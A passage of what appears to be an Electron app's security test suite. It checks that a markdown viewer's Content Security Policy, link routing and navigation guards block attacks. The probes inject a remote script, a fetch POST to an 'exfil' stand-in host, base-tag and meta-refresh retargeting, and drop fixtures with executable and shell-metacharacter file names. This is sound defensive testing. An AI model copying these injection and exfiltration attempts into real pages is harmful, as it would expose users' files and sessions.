          p.session !== window.getReloadRequestSession() ||
          p.toast !== document.getElementById('notificationToast') ||
          p.message !== document.getElementById('notificationMessage') ||
          window.MarkalooDialogs !== p.observedDialogs || window.confirm !== p.observedConfirm) {
        throw new Error('SEC-11 image-map lost its live page observations');
      }
      return { clicks:p.clicks.map(c => ({ selected:c.selected,href:c.href,
        trusted:c.event.isTrusted,prevented:c.event.defaultPrevented })),
        errors:p.errors.slice(),notices:p.notices.slice(),dialogs:p.dialogCalls.slice(),
        confirms:p.confirms.slice(),opened:p.opened,notifications:p.notifications.slice(),
        renderError:window.__lastRenderError,pwned:window.__pwned };
    })()`);
    const after = sec11Shutdown.state();
    const current = sec11Authority() && before.renderer === "ready" && after.renderer === "ready" &&
      before.rendererGeneration === after.rendererGeneration && generation === after.rendererGeneration &&
      generation === sec11Owner.identity.rendererGeneration &&
      after.rendererPageSession === sec11Owner.pageSession &&
      sec11Shutdown.documentAdmissionIsCurrent(sec11Owner.descriptor.ref) === true &&
      securityImageOwnerMatches(owner, sec11AreaFile, sec11AreaBody, "Nav") &&
      owner.id === sec11Owner.id && isDeepStrictEqual(owner.identity, sec11Owner.identity) &&
      isDeepStrictEqual(owner.descriptor, sec11Owner.descriptor) &&
      sec11ReadFile.call(fs,sec11AreaFile,"utf8") === sec11AreaBody;
    const quiet = page.errors.length === 0 && page.notices.length === 0 && page.dialogs.length === 0 &&
      page.confirms.length === 0 && page.notifications.length === 0 && !page.opened &&
      page.renderError === null && page.pwned === null;
    if (!current || !quiet) throw new Error("SEC-11 image-map owner/observations changed: " +
      JSON.stringify({ owner, page, before, after }));
    return page;
  };
  try {
    sec11Installed = true;
    securityGestureRegistration.observer = sec11Observer;
    sec11Contents.send = sec11ObservedSend;
    for (const item of sec11FsSlots) item.object[item.key] = item.installed;
    sec11Contents.on("did-start-navigation", sec11OnNavigation);
    sec11PageAttempted = true;
    await exec(`(() => {
      if (window.__securityArea || !Array.isArray(window.__e2eErrors) ||
          window.__e2eErrors.length || document.querySelector('#appMessageDialog[open]')) {
        throw new Error('SEC-11 image-map observation starts in an unexpected state');
      }
      const p = window.__securityArea = {
        owner:${JSON.stringify(sec11Key)},errors:window.__e2eErrors,tabs:window.CustomTabs,
        folia:window.folia,session:window.getReloadRequestSession(),clicks:[],notices:[],
        dialogCalls:[],confirms:[],notifications:[],opened:false,target:null,
        dialogs:window.MarkalooDialogs,confirm:window.confirm,
        toast:document.getElementById('notificationToast'),
        message:document.getElementById('notificationMessage')
      };
      if (!p.toast || !p.message || typeof p.dialogs?.show !== 'function') {
        throw new Error('SEC-11 image-map has no current observation targets');
      }
      p.capture = event => {
        const area = event.target?.closest?.('#viewer area');
        if (area) p.clicks.push({event,selected:area===p.target,href:area.getAttribute('href')});
      };
      window.addEventListener('click', p.capture, true);
      p.unsubscribe = window.folia.onError(message => p.notices.push(String(message)));
      if (typeof p.unsubscribe !== 'function') throw new Error('SEC-11 error subscription has no cleanup');
      p.observedDialogs = Object.freeze({...p.dialogs,show(...args) {
        p.dialogCalls.push(String(args[0]?.title || 'untitled')); return p.dialogs.show(...args);
      }});
      p.observedConfirm = message => {
        p.confirms.push(String(message)); throw new Error('Unexpected image-map confirmation');
      };
      window.MarkalooDialogs = p.observedDialogs; window.confirm = p.observedConfirm;
      p.observer = new MutationObserver(records => {
        if (document.querySelector('#appMessageDialog[open]') ||
            records.some(r => r.target.id === 'appMessageDialog' &&
              r.attributeName === 'open' && r.oldValue !== null)) p.opened = true;
        const changed = records.some(r => (r.type === 'childList' || r.type === 'characterData') &&
          (r.target === p.message || p.message.contains(r.target)));
        const showing = records.filter(r => r.target === p.toast && r.attributeName === 'class')
          .map(r => (r.oldValue || '').split(/\\s+/).includes('show'));
        showing.push(p.toast.classList.contains('show'));
        if (changed || showing.some((shown,i) => !shown && showing[i+1])) {
          p.notifications.push(p.message.textContent);
        }
      });
      p.observer.observe(document.body, {subtree:true,childList:true,characterData:true,
        attributes:true,attributeFilter:['open','class'],attributeOldValue:true});
      return true;
    })()`);
    sec11Owner = await admitSecurityImageFixture(sec11AreaFile, sec11AreaBody, "Nav", ["m"], []);
    // Keep the original forced-full case and settle, without clearing admission observations.
    await exec(`window.renderMarkdown(${JSON.stringify(sec11AreaBody)}, "full")`);
    await sleep(1000);
    areaState = await exec(`(() => {
      const a = document.querySelector('#viewer area');
      return a ? {present:true,href:a.getAttribute('href')} : {present:false};
    })()`);
    const sec11Point = await exec(`(async () => {
      const p = window.__securityArea, areas = document.querySelectorAll('#viewer area');
      const images = document.querySelectorAll('#viewer img[usemap="#m"]');
      if (areas.length !== 1 || images.length !== 1 ||
          areas[0].getAttribute('href') !== 'https://probe.invalid/area' ||
          areas[0].getAttribute('shape') !== 'rect' || areas[0].getAttribute('coords') !== '0,0,20,20' ||
          areas[0].getAttribute('alt') !== 'AreaProbe' || areas[0].closest('map')?.name !== 'm' ||
          images[0].getAttribute('alt') !== 'm') throw new Error('SEC-11 original image-map carrier changed');
      const a = areas[0], image = images[0];
      image.scrollIntoView({block:'center',inline:'center',behavior:'instant'});
      await new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)));
      const r = image.getBoundingClientRect(), points = [];
      for (const fx of [0.5,0.2,0.8]) for (const fy of [0.5,0.2,0.8]) {
        points.push({x:Math.round(r.left+Math.min(r.width,20)*fx),
          y:Math.round(r.top+Math.min(r.height,20)*fy)});
      }
      const point = points.find(p => document.elementFromPoint(p.x,p.y) === a);
      if (!point) throw new Error('SEC-11 original AREA has no verified visible pointer hit');
      p.target = a;
      return {...point,hit:document.elementFromPoint(point.x,point.y)===a,
        href:a.getAttribute('href'),width:r.width,height:r.height};
    })()`);
    check("SETUP SEC-11 original AREA is the actual visible native-input target",
      sec11Point.hit && sec11Point.width > 0 && sec11Point.height > 0 &&
        sec11Point.href === "https://probe.invalid/area", JSON.stringify(sec11Point));
    const sec11Initial = await sec11Read();
    const sec11BeforeInputExternal = await visualUtils.readExternalOpens(win);
    const sec11BeforeInputShell = await visualUtils.readShellOpens(win);
    if (!sec11Point.hit || sec11Initial.clicks.length || sec11Entries.length ||
        sec11Sends.length || sec11Navigation.length || sec11Faults.length || sec11Work.length ||
        !isDeepStrictEqual(sec11BeforeInputExternal,sec11BeforeExternal) ||
        !isDeepStrictEqual(sec11BeforeInputShell,sec11BeforeShell)) {
      throw new Error("SEC-11 image-map received effects before its native input");
    }
    urlBeforeArea = sec11Contents.getURL();
    sec11Phase = "route";
    sec11Active = true;
    sec11Contents.sendInputEvent({type:"mouseDown",x:sec11Point.x,y:sec11Point.y,button:"left",clickCount:1});
    sec11Contents.sendInputEvent({type:"mouseUp",x:sec11Point.x,y:sec11Point.y,button:"left",clickCount:1});
    await sleep(700);
    await exec("window.folia.getVersion()");
    const sec11Page = await sec11Read();
    const sec11External = await visualUtils.readExternalOpens(win);
    const sec11ShellPaths = await visualUtils.readShellOpens(win);
    const sec11Delta = sec11External.slice(sec11BeforeExternal.length);
    externalUrl = sec11Delta.length === 1 ? sec11Delta[0] : null;
    urlAfterArea = sec11Contents.getURL();
    const sec11Entry = sec11Entries[0], sec11Click = sec11Page.clicks[0];
    const sec11Routed = sec11Entries.length === 1 && sec11Entry.owner && sec11Entry.frame &&
      sec11Entry.kind === "link" && sec11Entry.href === "https://probe.invalid/area" &&
      sec11Entry.ref === sec11Owner.descriptor.ref && sec11Entry.settled &&
      sec11Entry.result === true && sec11Entry.error === null &&
      sec11Page.clicks.length === 1 && sec11Click.selected && sec11Click.trusted &&
      sec11Click.prevented && sec11Click.href === "https://probe.invalid/area" &&
      isDeepStrictEqual(sec11External.slice(0,sec11BeforeExternal.length),sec11BeforeExternal) &&
      isDeepStrictEqual(sec11ShellPaths,sec11BeforeShell) &&
      externalUrl === "https://probe.invalid/area" && sec11Sends.length === 0 &&
      sec11Navigation.length === 0 && sec11Faults.length === 0 && sec11Work.length === 0 &&
      await waitForExternalTrap(win);
    check("SEC-11 trusted AREA input has exact Main, owner and recorded shell effects",
      sec11Routed, JSON.stringify({sec11Entry,sec11Click,sec11External,sec11ShellPaths,
        sends:sec11Sends,navigation:sec11Navigation,faults:sec11Faults,work:sec11Work}));
    if (!sec11Routed) throw new Error("SEC-11 image-map refuses unvalidated route evidence");
    sec11Phase = "retirement";
    await closeSecurityImageFixture(sec11Owner,sec11AreaFile,sec11AreaBody,"Nav");
    await exec("window.folia.getVersion()");
    if (sec11Shutdown.documentAdmissionIsCurrent(sec11Owner.descriptor.ref) !== false ||
        !sec11Authority()) throw new Error("SEC-11 image-map Main admission did not actually retire");
    const sec11FinalExternal = await visualUtils.readExternalOpens(win);
    const sec11FinalShell = await visualUtils.readShellOpens(win);
    if (!isDeepStrictEqual(sec11FinalExternal,sec11External) ||
        !isDeepStrictEqual(sec11FinalShell,sec11ShellPaths) || sec11Entries.length !== 1 ||
        sec11Sends.length || sec11Navigation.length || sec11Faults.length ||
        !sec11Work.every(sec11RetirementWork)) {
      throw new Error("SEC-11 image-map received late or unattributed effects during retirement");
    }
  } catch (error) {
    sec11Failure = error;
  } finally {
    sec11Phase = "disposal";
    const errors = [];
    if (sec11PageAttempted) {
      try {
        if (!sec11SamePage()) throw new Error("Original image-map page is unavailable");
        await exec(`(() => {
          const p = window.__securityArea;
          if (!p) return true;
          if (p.owner !== ${JSON.stringify(sec11Key)}) throw new Error('Image-map cleanup has no observation owner');
          const releaseErrors = [];
          const release = (label,action) => {
            try { action(); } catch (error) { releaseErrors.push(label+': '+String(error.message||error)); }
          };
          release('subscription',() => { if (typeof p.unsubscribe === 'function') p.unsubscribe(); });
          release('click',() => window.removeEventListener('click',p.capture,true));
          release('mutations',() => p.observer?.disconnect());
          release('dialogs',() => {
            if (!p.observedDialogs) return;
            if (window.MarkalooDialogs !== p.observedDialogs) throw new Error('Observation changed');
            window.MarkalooDialogs = p.dialogs;
          });
          release('confirmation',() => {
            if (!p.observedConfirm) return;
            if (window.confirm !== p.observedConfirm) throw new Error('Observation changed');
            window.confirm = p.confirm;
          });
          const quiet = p.errors === window.__e2eErrors && p.errors.length === 0 &&
            p.tabs === window.CustomTabs && p.folia === window.folia &&
            p.session === window.getReloadRequestSession() &&
            p.toast === document.getElementById('notificationToast') &&
            p.message === document.getElementById('notificationMessage') &&
            p.notices.length === 0 && p.dialogCalls.length === 0 && p.confirms.length === 0 &&
            p.notifications.length === 0 && !p.opened &&
            window.__lastRenderError === null && window.__pwned === null &&
            p.clicks.length === 1 && p.clicks[0].selected &&
            p.clicks[0].event.isTrusted && p.clicks[0].event.defaultPrevented;
          if (!quiet || releaseErrors.length) throw new Error('Image-map cleanup retains failed observations: '+
            JSON.stringify({releaseErrors,errors:p.errors,notices:p.notices,dialogs:p.dialogCalls,
              confirms:p.confirms,notifications:p.notifications,opened:p.opened,clicks:p.clicks.length}));
          delete window.__securityArea;
          return true;
        })()`);
      } catch (error) { errors.push("page: " + String(error.message || error)); }
    }
    try { sec11Contents.removeListener("did-start-navigation",sec11OnNavigation); }
    catch (error) { errors.push("navigation: " + String(error.message || error)); }
    if (!sec11Failure) {
      try {
        const external = await visualUtils.readExternalOpens(win);
        const shell = await visualUtils.readShellOpens(win);
        if (!isDeepStrictEqual(external,[...sec11BeforeExternal,"https://probe.invalid/area"]) ||
            !isDeepStrictEqual(shell,sec11BeforeShell) || sec11Entries.length !== 1 ||
            sec11Sends.length || sec11Navigation.length || sec11Faults.length ||
            !sec11Work.every(sec11RetirementWork) ||
            sec11Shutdown.documentAdmissionIsCurrent(sec11Owner.descriptor.ref) !== false) {
          throw new Error("Unaccounted effects during image-map observation disposal");
        }
      } catch (error) { errors.push("terminal effects: " + String(error.message || error)); }
    }
    if (sec11Installed) {
      for (const [object,key,installed,slot] of [
        [sec11Contents,"send",sec11ObservedSend,sec11Slots.send],
        [securityGestureRegistration,"observer",sec11Observer,sec11Slots.observer],
        ...sec11FsSlots.map(item => [item.object,item.key,item.installed,item.slot]),
      ]) {
        try {
          if (Object.getOwnPropertyDescriptor(object,key)?.value !== installed) {
            throw new Error("Observation lost ownership");
          }
          if (slot) Object.defineProperty(object,key,slot); else delete object[key];
          if (!isDeepStrictEqual(Object.getOwnPropertyDescriptor(object,key),slot)) {
            throw new Error("Original observation descriptor was not restored");
          }
        } catch (error) { errors.push(key + ": " + String(error.message || error)); }
      }
      sec11Installed = false;
    }
    sec11Active = false;
    if (!sec11Authority() || !await waitForExternalTrap(win)) errors.push("Main authority/shared trap");
    if (errors.length) throw new Error("SEC-11 image-map observation cleanup failed: " +
      errors.join("; ") + (sec11Failure ? "\nOriginal failure: " + String(sec11Failure.stack || sec11Failure) : ""));
  }
  if (sec11Failure) throw sec11Failure;
  check(
    "SEC-11 an <area href> is routed through the link policy, not Chromium",
    areaState.present === true &&
      areaState.href === "https://probe.invalid/area" &&
      externalUrl === "https://probe.invalid/area" &&
      urlAfterArea === urlBeforeArea,
    JSON.stringify({ areaState, externalUrl, urlBeforeArea, urlAfterArea }),
  );

  // ==========================================================================
  // SEC-09 - Content Security Policy on the main window
  //
  // These probes deliberately build elements with document.createElement and
  // call eval/fetch directly instead of going through markdown. The sanitizer
  // already stops most of this markup, so routing through render() would test
  // DOMPurify a second time and pass with the CSP deleted. The layer under
  // test here is the policy itself, so the sanitizer is bypassed on purpose.
  //
  // A violation is reported to `securitypolicyviolation` on the document that
  // owns the blocked load. That makes it the only way to tell "the CSP refused
  // this" apart from "the network refused this" - which matters because every
  // probe host below is unresolvable.
  //
  // Note the @@@html frame check above doubles as the control for the
  // 'unsafe-inline' decision: an about:srcdoc frame inherits this policy, so
  // if 'unsafe-inline' were dropped from script-src, `frameNav.ran` there goes
  // false and that check fails.
  await exec(`
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__csp.push({ d: e.violatedDirective, u: String(e.blockedURI || '') });
    });
    null;
  `);
  const cspHits = (frag, dir) =>
    exec(
      `window.__csp.some(v => v.d.indexOf(${JSON.stringify(dir)}) === 0 && v.u.indexOf(${JSON.stringify(frag)}) >= 0)`,
    );
  // securitypolicyviolation is delivered asynchronously, and how long that
  // takes varies with machine load - a fixed sleep is a coin flip that only
  // ever loses on a busy machine (observed: object-src arriving after 600ms
  // during a full-suite run, passing standalone). Poll for the violation
  // instead, so a slow delivery costs time rather than correctness.
  //
  // Only usable for the POSITIVE assertions. Absence cannot be polled for, so
  // the "not refused" cases keep a fixed settle.
  const waitForCsp = async (frag, dir, budgetMs) => {
    const deadline = Date.now() + (budgetMs || 8000);
    for (;;) {
      if (await cspHits(frag, dir)) return true;
      if (Date.now() > deadline) return false;
      await sleep(100);
    }
  };

  check(
    "SEC-09 a Content-Security-Policy meta is present in index.html",
    (await exec(
      `!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')`,
    )) === true,
  );

  // A remote script is the vector the vendoring work in SEC-16 removed by
  // hand; this makes it structurally impossible to reintroduce at runtime.
  await exec(`
    window.__remoteScriptRan = false;
    const s = document.createElement('script');
    s.src = 'https://probe.invalid/csp-remote.js';
    document.body.appendChild(s);
    null;
  `);
  await sleep(600);
  check(
    "SEC-09 a remote <script src> is refused by script-src",
    (await waitForCsp("probe.invalid", "script-src")) === true &&
      (await exec(`window.__remoteScriptRan === false`)) === true,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // No 'unsafe-eval'. Measured, not assumed: mermaid 11 and Prism both render
  // under this policy, so nothing on the render path needs it.
  const evalState = await exec(`
    (() => {
      try { (0, eval)('1+1'); return 'ran'; }
      catch (e) { return e && e.name ? e.name : 'threw'; }
    })()
  `);
  check(
    "SEC-09 eval() is blocked (script-src carries no 'unsafe-eval')",
    evalState === "EvalError",
    String(evalState),
  );

  // connect-src is the directive that actually earns its place: it is the
  // difference between "an injected script can read your files" and "an
  // injected script can read your files and post them somewhere".
  await exec(`
    fetch('https://probe.invalid/csp-exfil', { method: 'POST', body: 'x' })
      .then(() => {}, () => {});
    null;
  `);
  await sleep(600);
  check(
    "SEC-09 an outbound fetch to an unlisted host is refused by connect-src",
    (await waitForCsp("probe.invalid", "connect-src")) === true,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // <base> rewrites the resolution of every relative URL already in the
  // document, retroactively. base-uri 'none' is the only thing that stops it.
  const baseState = await exec(`
    (() => {
      const before = document.baseURI;
      const b = document.createElement('base');
      b.href = 'https://probe.invalid/base/';
      document.head.appendChild(b);
      const after = document.baseURI;
      b.remove();
      return { changed: before !== after };
    })()
  `);
  await sleep(400);
  check(
    "SEC-09 <base href> cannot retarget relative URLs (base-uri 'none')",
    baseState.changed === false &&
      (await waitForCsp("probe.invalid", "base-uri")) === true,
    JSON.stringify({ baseState, csp: await exec(`window.__csp`) }),
  );

  const objState = await exec(`
    (() => {
      const o = document.createElement('object');
      o.id = '__cspObjectProbe';
      o.data = 'https://probe.invalid/csp.swf';
      document.body.appendChild(o);
      // Reading layout here is load-bearing, not diagnostic. Chromium only
      // fetches <object data> once the element has been laid out, and it
      // throttles rendering for an occluded/background window - which is
      // exactly what this window is during an unattended full-suite run. Left
      // to itself the object is never laid out, never fetched, and never
      // refused, so the assertion below failed intermittently (and only when
      // run after another suite) against a policy that was working perfectly.
      // getBoundingClientRect() forces the layout synchronously.
      const r = o.getBoundingClientRect();
      const cs = getComputedStyle(o);
      return {
        connected: o.isConnected,
        w: r.width, h: r.height,
        display: cs.display,
        parent: o.parentElement && o.parentElement.tagName,
        bodyChildren: document.body.children.length,
      };
    })()
  `);
  await sleep(600);
  check(
    "SEC-09 plugin content is refused by object-src 'none'",
    (await waitForCsp("probe.invalid", "object-src")) === true,
    // The element's own state is reported alongside the violation list: an
    // <object> that never got a layout box is never fetched, so it would never
    // provoke a violation either - a very different failure from "object-src
    // stopped blocking", and indistinguishable from the violation list alone.
    JSON.stringify({ objState, csp: await exec(`window.__csp`) }),
  );

  // img-src deliberately keeps https:. Remote images in markdown are a real
  // feature and blocking them would be a silent rendering regression; the
  // read-receipt exposure that leaves is recorded in the audit rather than
  // traded away here. Cleartext http: is not kept, and this pins both halves
  // of that decision so neither can drift unnoticed.
  await exec(`
    const a = document.createElement('img');
    a.src = 'http://probe.invalid/cleartext.png';
    document.body.appendChild(a);
    const b = document.createElement('img');
    b.src = 'https://probe.invalid/secure.png';
    document.body.appendChild(b);
    null;
  `);
  await sleep(700);
  check(
    "SEC-09 img-src refuses cleartext http: but still allows https:",
    (await waitForCsp("cleartext.png", "img-src")) === true &&
      (await cspHits("secure.png", "img-src")) === false,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // Control: the app loads mermaid at runtime by appending a <script src> to a
  // local path. If 'self' did not match on a file:// origin, every diagram in
  // the app would silently stop rendering - and this is the assertion that
  // says so out loud.
  await render("# csp\n\n```mermaid\ngraph TD\n  A[a] --> B[b]\n```\n", "full", 3000);
  check(
    "SEC-09 script-src 'self' still permits the app's own local scripts",
    (await exec(`typeof window.mermaid`)) === "object" &&
      (await exec(
        `!!document.querySelector('#viewer .mermaid svg') || !!document.querySelector('#viewer svg[id^="mermaid"]')`,
      )) === true &&
      (await cspHits("mermaid", "script-src")) === false,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // <meta http-equiv="refresh"> is the other markup-only route. DOMPurify drops
  // <meta>; assert it, so a future ADD_TAGS change cannot quietly re-enable it.
  await render(
    '# Nav\n\n<meta http-equiv="refresh" content="0;url=https://probe.invalid/mr">\n',
    "full",
    600,
  );
  check(
    "SEC-11 <meta http-equiv=refresh> does not survive sanitization",
    (await exec(`document.getElementById('viewer').querySelectorAll('meta').length`)) === 0,
  );

  // window.open must be denied by setWindowOpenHandler. Electron returns null
  // for a denied open, so this is observable from the renderer itself.
  check(
    "SEC-11 window.open from the main window is denied",
    (await exec(`window.open('https://probe.invalid/wo') === null`)) === true,
  );

  // The load-bearing one: an actual navigation attempt. A local file is used
  // rather than a remote URL so the result cannot be confused with a network
  // failure - if the guard were absent this page would commit successfully and
  // getURL() would change. Placed last because that failure destroys the
  // harness's own document.
  const navProbe = path.join(dir, "nav-probe.html");
  fs.writeFileSync(navProbe, "<html><body>navigated</body></html>", "utf8");
  const urlBefore = win.webContents.getURL();
  await exec(
    `window.location.href = ${JSON.stringify("file:///" + navProbe.replace(/\\/g, "/"))}; null`,
  );
  await sleep(900);
  const urlAfter = win.webContents.getURL();
  check(
    "SEC-11 main-window navigation away from index.html is blocked",
    urlAfter === urlBefore && /index\.html$/.test(urlAfter),
    `before=${urlBefore} after=${urlAfter}`,
  );

  // Nothing above should have produced an uncaught renderer error. `errs` was
  // snapshotted before the navigation probes because a failed guard destroys
  // the document that holds it; this second read catches anything the probes
  // themselves raised, and is monotonic so it cannot regress the first check.
  const errsAfter = await exec(`window.__e2eErrors`);
  check(
    "no uncaught renderer errors",
    Array.isArray(errs) &&
      errs.length === 0 &&
      Array.isArray(errsAfter) &&
      errsAfter.length === 0,
    JSON.stringify({ errs, errsAfter }),
  );

  // Drag overlays use DOM events. File admission must use a real browser drop.
  {
    const contents = win.webContents, frame = contents.mainFrame;
    const pageUrl = contents.getURL(), shutdown = require("../src/main.js").__shutdown;
    const generation = shutdown.state().rendererGeneration;
    const dropPageKey = require("node:crypto").randomUUID();
    const fixtureNames = ["notes.md", "a.markdown", "a.mdown", "a.mkd",
      "a.mkdn", "a.mmd", "a.mermaid", "upper.MD", "dirty.md", "other.md",
      "payload.exe", "holiday.mp4", "Makefile", "notes.md.exe", "a$'$&x.exe"];
    const fixtures = new Map(fixtureNames.map(name => {
      const filePath = path.join(dir, "drop-" + name), heading = "Security drop " + name;
      const body = (/\.m(?:md|ermaid)$/i.test(name)
        ? "```mermaid\ngraph TD\n  A[Drop] --> B[Ready]\n```\n\n" : "") +
        "# " + heading + "\n\nExact dropped document: " + name + "\n";
      fs.writeFileSync(filePath, body);
      return [name, { filePath, heading, body }];
    }));
    const fixturePaths = new Set([...fixtures.values()].map(item => item.filePath));
    const entries = [], sends = [], reads = [], faults = [];
    let active = null, ownsDebugger = false, dragPending = false, failure = null;
    let pageAttempted = false;
    const originalSend = contents.send, originalOpen = fs.promises.open;
    const empty = await readSecurityImageOwner(null);
    if (empty.tabs.length || empty.id !== null || empty.current !== null ||
        empty.descriptor !== null || empty.identity !== null ||
        empty.pending.pending || empty.pending.count ||
        securityGestureRegistration.observer !== null) {
      throw new Error("Drop actor requires an empty admitted owner and its own Main observation slot");
    }
    const samePage = () => win === observedMain && !win.isDestroyed() &&
      !contents.isDestroyed() && win.webContents === contents &&
      contents.mainFrame === frame && !frame.isDestroyed() &&
      contents.getURL() === pageUrl && frame.url === pageUrl &&
      shutdown.state().renderer === "ready" &&
      shutdown.state().rendererGeneration === generation && securityDialogGuardsIntact();
    const observer = {
      enter(event, data) {
        const record = { filePath: data?.filePath, kind: data?.kind,
          sender: event.sender === contents, frame: event.senderFrame === frame,
          url: event.senderFrame?.url, action: active };
        entries.push(record);
        if (!samePage() || !active?.pending || data?.kind !== "drop" ||
            data.filePath !== active.fixture.filePath || !record.sender ||
            !record.frame || record.url !== pageUrl) {
          faults.push("Unexpected, stale or unattributed Main drop entry");
        }
        return record;
      },
      finish(record, result, error) {
        if (!record?.action || record.action !== active || !active.pending ||
            active.settled) {
          faults.push("Main drop settlement lost its action");
          return;
        }
        active.result = result;
        active.error = error ? String(error.message || error) : null;
        active.settled = true;
      },
    };
    const observedSend = function(channel, value) {
      if (["external-file-open-request", "file-opened", "show-error"].includes(channel)) {
        sends.push({ channel, value, action: active });
        if (!active?.pending) faults.push("Unattributed late Main drop delivery");
      }
      return originalSend.apply(this, arguments);
    };
    const observedOpen = function(filePath) {
      if (fixturePaths.has(String(filePath))) {
        reads.push({ filePath: String(filePath), action: active });
        if (!active?.pending) faults.push("Unattributed dropped-file read");
      }
      return originalOpen.apply(this, arguments);
    };
    const dropSlots = [
      [contents, "send", observedSend, originalSend],
      [fs.promises, "open", observedOpen, originalOpen],
      [securityGestureRegistration, "observer", observer, null],
    ].map(([object, key, installed, original]) => ({
      object, key, installed, original, descriptor: Object.getOwnPropertyDescriptor(object, key),
    }));
    async function dropWait(predicate, label) {
      const deadline = Date.now() + 12000;
      for (;;) {
        if (!samePage() || faults.length || contents.send !== observedSend ||
            fs.promises.open !== observedOpen ||
            securityGestureRegistration.observer !== observer) {
          throw new Error("Drop authority failed during " + label + ": " + faults.join("; "));
        }
        const result = await predicate();
        if (result) return result;
        if (Date.now() >= deadline) throw new Error("Drop actor timed out: " + label);
        await sleep(40);
      }
    }
    const pageState = () => exec(`(() => {
      const p = window.__securityDrop;
      if (!p || p.ownerKey !== ${JSON.stringify(dropPageKey)} ||
          p.listener !== window.__securityDropListener ||
          p.fireDrag !== window.__fireDrag) {
        throw new Error('Drop page observation lost ownership');
      }
      const dialog = document.querySelector('#appMessageDialog[open]');
      return {
        events: p.events.map(item => ({ trusted: item.event.isTrusted,
          prevented: item.event.defaultPrevented, count: item.count, name: item.name })),
        overlay: document.body.classList.contains('drop-active'),
        notification: { text: document.getElementById('notificationMessage')?.textContent,
          visible: !!document.getElementById('notificationToast')?.classList.contains('show') },
        dialog: dialog ? { text: dialog.textContent,
          choices: Array.from(dialog.querySelectorAll('[data-dialog-choice]'),
            button => button.dataset.dialogChoice) } : null,
      };
    })()`);
    async function disposeDropPage() {
      if (!samePage()) throw new Error("Original drop page was lost; page disposal is unconfirmed");
      await exec(`(() => {
        const p = window.__securityDrop;
        if (!p || p.ownerKey !== ${JSON.stringify(dropPageKey)} ||
            p.listener !== window.__securityDropListener ||
            p.fireDrag !== window.__fireDrag) throw new Error('Drop disposal lost its owned probe');
        window.removeEventListener('drop', p.listener);
        window.__fireDrag('dragend', []);
        delete window.__fireDrag; delete window.__securityDropListener; delete window.__securityDrop;
        return true;
      })()`);
    }
    async function dropBarrier() {
      await exec(`new Promise(resolve => requestAnimationFrame(() =>
        requestAnimationFrame(() => resolve(true))))`);
      await exec("window.folia.getVersion()");
    }
    function securityDropIngressMatches(action, event) {
      const own = entries.slice(action.start.entries);
      return own.length === 1 && own[0].action === action && own[0].kind === "drop" &&
        own[0].sender && own[0].frame && own[0].url === pageUrl &&
        own[0].filePath === action.fixture.filePath &&
        action.settled === true && action.error === null &&
        event?.trusted === true && event.prevented === true && event.count === 1 &&
        event.name === path.basename(action.fixture.filePath);
    }
    function dropDocumentMatches(owner, fixture, count) {
      return owner.tabs.length === count && owner.tabs.some(tab =>
        tab.id === owner.id && tab.path === fixture.filePath) &&
        owner.path === fixture.filePath && owner.current === fixture.filePath &&
        owner.content === fixture.body && owner.original === fixture.body &&
        owner.live === fixture.body && owner.descriptor?.logicalPath === fixture.filePath &&
        owner.descriptor.documentUrl === pathToFileURL(fixture.filePath).href &&
        /^[a-f0-9]{64}$/.test(owner.descriptor.ref) &&
        owner.identity?.tabId === owner.id &&
        owner.identity.documentRef === owner.descriptor.ref &&
        owner.identity.rendererGeneration === generation &&
        owner.identity.pageSession === owner.pageSession &&
        owner.state?.maintained === true && owner.state.dirty === false &&
        owner.state.liveWitnessMatchesContent === true && owner.markedDirty === false &&
        !owner.pending.pending && owner.pending.count === 0 &&
        owner.heading === fixture.heading && owner.loading === false && !owner.welcome;
    }
    async function dispatchDrop(fixture, choice = null) {
      if (active) throw new Error("Drop actions must not overlap");
      const before = await pageState();
      const action = { fixture, pending: true, settled: false,
        start: { entries: entries.length, sends: sends.length, reads: reads.length,
          events: before.events.length } };
      active = action;
      const point = await exec(`(() => {
        const viewer = document.getElementById('viewer'), r = viewer.getBoundingClientRect();
        const x = Math.round(r.left + Math.min(r.width / 2, 80));
        const y = Math.round(r.top + Math.min(r.height / 2, 80));
        if (r.width <= 0 || r.height <= 0 || !viewer.contains(document.elementFromPoint(x, y))) {
          throw new Error('Drop target has no verified visible viewport point');
        }
        return { x, y };
      })()`);
      const data = { items: [], files: [fixture.filePath], dragOperationsMask: 1 };
      dragPending = true;
      for (const type of ["dragEnter", "dragOver", "drop"]) {
        await dropWait(() => true, "browser dispatch ownership");
        await contents.debugger.sendCommand("Input.dispatchDragEvent", { type, ...point, data });
      }
      dragPending = false;
      await dropWait(async () => (await pageState()).events.length > action.start.events &&
        action.settled, "trusted browser delivery and actual Main settlement");
      if (choice) {
        const dialog = await dropWait(async () => (await pageState()).dialog,
          "the actual unsaved-document dialog");
        if (!dialog.text.includes(path.basename(fixture.filePath)) ||
            !isDeepStrictEqual(dialog.choices, ["cancel", "proceed"])) {
          throw new Error("Drop consent is not the expected exact document question");
        }
        const button = await exec(`(() => {
          const button = document.querySelector(
            '#appMessageDialog[open] [data-dialog-choice="${choice}"]');
          const r = button?.getBoundingClientRect();
          if (!r || r.width <= 0 || r.height <= 0) throw new Error('Drop consent has no visible choice');
          const x = Math.round(r.left + r.width / 2), y = Math.round(r.top + r.height / 2);
          if (!button.contains(document.elementFromPoint(x, y))) throw new Error('Drop consent choice is obscured');
          return { x, y };
        })()`);
        contents.sendInputEvent({ type: "mouseDown", ...button, button: "left", clickCount: 1 });
        contents.sendInputEvent({ type: "mouseUp", ...button, button: "left", clickCount: 1 });
        await dropWait(async () => !(await pageState()).dialog, "actual document choice completion");
      }
      return action;
    }
    async function finishDrop(action, accepted) {
      await dropBarrier();
      const page = await pageState(), events = page.events.slice(action.start.events);
      const ownSends = sends.slice(action.start.sends), ownReads = reads.slice(action.start.reads);
      const offers = ownSends.filter(item => item.channel === "external-file-open-request");
      const opens = ownSends.filter(item => item.channel === "file-opened");
      const errors = ownSends.filter(item => item.channel === "show-error");
      const ingress = events.length === 1 && securityDropIngressMatches(action, events[0]);
      const attributed = ownSends.every(item => item.action === action) &&
        ownReads.every(item => item.action === action && item.filePath === action.fixture.filePath);
      check("drop has exact trusted browser, sender/frame, path and terminal Main evidence: " +
